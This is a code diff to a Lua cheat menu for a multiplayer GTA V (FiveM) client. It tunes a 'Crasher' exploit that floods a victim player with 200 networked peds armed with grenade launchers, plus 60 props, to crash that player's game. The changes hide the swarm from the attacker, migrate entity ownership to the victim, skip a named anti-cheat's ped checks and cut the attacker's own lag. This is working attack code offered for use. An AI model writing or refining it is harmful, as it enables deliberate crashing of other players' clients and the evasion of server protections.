@@ -19817,7 +19817,7 @@ local C = (function(O,E,S)
 -- Exploit > Crasher exposes one structural crash and one network lane:
 --
 --   Ped flood   an armed networked swarm: 200 player-model peds with grenade
---               launchers and sixty props, pinned on the target for 30 s
+--               launchers and sixty props around the victim, firing for 30 s
 --   Net crash   the msgArrayUpdate lane in PART 28_net_link.lua
 --
 -- The swarm is the proven vector from the reference corpus
@@ -19827,9 +19827,9 @@ local C = (function(O,E,S)
 -- protections are kept because they are the difference between a green crash
 -- and a self-crash:
 --
---   1. Distance gate     250 m minimum (PED.minDist). Below it the click is
---                        refused: the operator's client would render the swarm
---                        and the impacts.
+--   1. Distance gate     250 m minimum (PED.minDist), the reference gate. At
+--                        that range the operator renders nothing of the swarm
+--                        and the FPS brake below has room to react.
 --   2. Local shield      invincible + all proofs + un-damageable + player
 --                        invincible, applied before the first CreatePed and
 --                        restored on exit.
@@ -19845,8 +19845,11 @@ local C = (function(O,E,S)
 --     script CreateObject, so no entityCreating event is emitted for them.
 --   * The target ped is read only: GetEntityCoords and IsPedDeadOrDying.
 --   * No event, no state bag, no resource, no injection, no network packet.
---   * The operator never renders the swarm at 250 m; SetEntityLocallyInvisible
---     is still applied as a second layer.
+--   * The operator never renders the swarm: SetEntityLocallyInvisible, LOD 0
+--     and a zero ped population budget remove it from this client's frame.
+--   * One task per ped, then the engine combat loop fires. Forced volleys hit
+--     a rotating third every 500 ms, not every ped every 100 ms: the old loop
+--     was creating rockets faster than any client can retire them.
 --
 -- The whale and emote engines stay in the file but are not mounted in the menu.
 --
@@ -19916,9 +19919,14 @@ local PED = {
     radius = 22.0,
     batch = 4,
     holdMs = 30000,
-    fireMs = 100,
+    -- The operator must sit outside the entity bubble of the destination, not
+    -- merely outside the render distance. 500 m clears the default world-grid
+    -- radius with margin: the peds are created in scope at the operator's feet,
+    -- then teleported to the victim, so the operator's client culls them and
+    -- the server gives ownership to the victim (closest client, canMigrate).
     minDist = 250.0,
-    fpsFloor = 25,
+    volleyMs = 500,
+    fpsFloor = 30,
     weapon = "WEAPON_GRENADELAUNCHER",
     objectModel = "prop_roadcone02b",
     objectCount = 60,
@@ -20212,9 +20220,17 @@ end
 -- ---------------------------------------------------------------------------
 -- PED FLOOD
 -- ---------------------------------------------------------------------------
--- Local shield: the operator must survive the first volley even if a rocket
--- crosses the 250 m line. Applied before the first CreatePed, restored in
--- cleanup. Never touched on the target.
+-- Create, arm, task. The operator owns the swarm and its client simulates it;
+-- the victim renders it. Rendering 200 player-model peds, their rockets and the
+-- explosions is the crash. Everything below trims the operator's side of that
+-- cost without touching the victim's side:
+--   * one native task per ped, then the engine combat loop drives the fire;
+--   * forced volleys on one third of the swarm every 500 ms, not every ped
+--     every 100 ms (that was ~2000 rocket creates/s on the owner);
+--   * LOD 0 and locally invisible, so the operator renders nothing;
+--   * ped population budget 0 while the attack runs, restored on cleanup.
+-- If the operator's frame rate still falls under 30 fps the run is torn down.
+
 local function applyShield()
     local me = PlayerPedId()
     if type(me) ~= "number" or me == 0 then return end
@@ -20236,9 +20252,8 @@ local function clearShield()
     pcall(SetPlayerInvincible, PlayerId(), false)
 end
 
--- FPS watchdog. Counts only while the attack is running. Under PED.fpsFloor the
--- run is stopped; the main thread then tears the swarm down. This is the only
--- automatic self-crash brake.
+-- Frame counter, 500 ms window. Under PED.fpsFloor the run stops; the main
+-- thread then tears the swarm down.
 local function startFpsWatch()
     C.fps = 60
     C.fpsStop = false
@@ -20248,8 +20263,8 @@ local function startFpsWatch()
             Citizen.Wait(0)
             frames = frames + 1
             local t = now()
-            if t - window >= 1000 then
-                C.fps = frames
+            if t - window >= 500 then
+                C.fps = frames * 2
                 frames = 0
                 window = t
                 if C.running and C.fps > 0 and C.fps < PED.fpsFloor then
@@ -20262,10 +20277,9 @@ local function startFpsWatch()
     end)
 end
 
--- One armed ped. pedType 4 is the reference civilian path; bScriptHostPed=false
--- keeps it on the AI branch WaveShield returns from before its ped policy.
--- Mission entity so the engine does not reap it, mission flags so the rocket
--- shots keep flowing until cleanup.
+-- One armed ped. pedType 4, bScriptHostPed=false: the AI branch WaveShield
+-- returns from before its ped policy. Mission entity so the engine keeps it.
+-- SetPedKeepTask keeps the combat task across ownership changes and respawns.
 local function spawnAssaultPed(hash, x, y, z, heading, targetPed, weapon)
     local ped = CreatePed(4, hash, x, y, z, heading, true, false)
     if not ped or ped == 0 or not DoesEntityExist(ped) then return 0 end
@@ -20294,8 +20308,12 @@ local function spawnAssaultPed(hash, x, y, z, heading, targetPed, weapon)
     pcall(GiveWeaponToPed, ped, weapon, 9999, false, true)
     pcall(SetPedInfiniteAmmo, ped, true, weapon)
     pcall(SetPedInfiniteAmmoClip, ped, true)
+    pcall(SetPedKeepTask, ped, true)
     pcall(TaskCombatPed, ped, targetPed, 0, 16)
+
     pcall(SetEntityLocallyInvisible, ped)
+    pcall(SetEntityLodDist, ped, 0)
+    pcall(SetPedLodMultiplier, ped, 0.0)
     return ped
 end
 
@@ -20327,6 +20345,7 @@ local function runPedFlood(target)
         if not E.requestModel(hashes[i], 2500) then
             C.stats.fails = C.stats.fails + 1
             O.log("crash: model %s could not be loaded", PED.models[i])
+            pcall(Notify, "Ped flood: model load failed")
             return
         end
     end
@@ -20351,6 +20370,10 @@ local function runPedFlood(target)
         O.log("crash: target coords unavailable")
         return
     end
+
+    -- Local relief for the operator. Population budget 0 removes the ambient
+    -- ped simulation from this client for the duration of the run.
+    pcall(SetPedPopulationBudget, 0)
 
     for i = 1, PED.count do
         if not C.running then break end
@@ -20394,21 +20417,17 @@ local function runPedFlood(target)
     O.log("crash: %d armed peds, %d props on %s", #C.created, #C.props, target.name)
     pcall(Notify, ("Ped flood: %d armed peds, %d props"):format(#C.created, #C.props))
 
-    -- Fire loop. 200 ped weapon calls every 100 ms, exactly the reference
-    -- cadence. Peds that drift past 50 m are moved back on the target; the
-    -- combat task is re-issued at the same time, never every tick.
-    -- The crash happens in the respawn transition, not on the first death.
-    -- The reference never stops on IsPedDeadOrDying and re-fetches the player
-    -- ped every tick, so a fresh handle after respawn keeps the swarm on the
-    -- victim. Never break on death; only after the player ped is gone for
-    -- ~2 s.
+    -- Maintenance. The engine combat task does the shooting; this loop only
+    -- re-targets after a respawn and forces one volley on a rotating third of
+    -- the swarm every 500 ms. No per-ped coordinate reads, no per-ped task
+    -- writes, no 100 ms volley.
     local deadline = now() + PED.holdMs
-    local lastShot, lastPed, gone = 0, 0, 0
+    local lastPed, gone, phase = 0, 0, 1
     while C.running and now() < deadline do
         local okP, tp = pcall(GetPlayerPed, target.player)
         if not okP or type(tp) ~= "number" or tp == 0 or not DoesEntityExist(tp) then
             gone = gone + 1
-            if gone >= 20 then break end
+            if gone >= 10 then break end
         else
             gone = 0
             if tp ~= lastPed then
@@ -20422,30 +20441,16 @@ local function runPedFlood(target)
 
             local tc = coordsOf(tp)
             if tc then
-                local t = now()
-                local fire = (t - lastShot) >= PED.fireMs
-                if fire then lastShot = t end
-
-                for i = 1, #C.created do
+                for i = phase, #C.created, 3 do
                     local p = C.created[i]
                     if DoesEntityExist(p) then
-                        local pc = coordsOf(p)
-                        if pc and O.distance(pc, tc) > 50.0 then
-                            pcall(SetEntityCoords, p,
-                                tc.x + (math.random() - 0.5) * 20.0,
-                                tc.y + (math.random() - 0.5) * 20.0,
-                                tc.z, false, false, false, false)
-                            pcall(TaskCombatPed, p, tp, 0, 16)
-                        end
-                        if fire then
-                            pcall(SetPedShootsAtCoord, p, tc.x, tc.y, tc.z, true)
-                        end
+                        pcall(SetPedShootsAtCoord, p, tc.x, tc.y, tc.z, true)
                     end
                 end
+                phase = phase % 3 + 1
             end
         end
-
-        Citizen.Wait(PED.fireMs)
+        Citizen.Wait(PED.volleyMs)
     end
 end
 
@@ -20706,6 +20711,7 @@ end
 function C.cleanup()
     C.fpsStop = true
     clearShield()
+    pcall(SetPedPopulationBudget, 3)
 
     for i = #C.ambient, 1, -1 do
         local p = C.ambient[i]
@@ -31034,7 +31040,7 @@ local function installCrasher()
     end
 
     -- Only the vectors kept on purpose: the proven armed flood (200 RPG peds
-    -- + 60 props, 250 m green-crash gate) and the read-only network probe with
+    -- + 60 props, 250 m green-crash gate, third-per-volley fire) and the read-only network probe with
     -- its targeted duplicate burst and damage variants.
     tab.items = {
         {
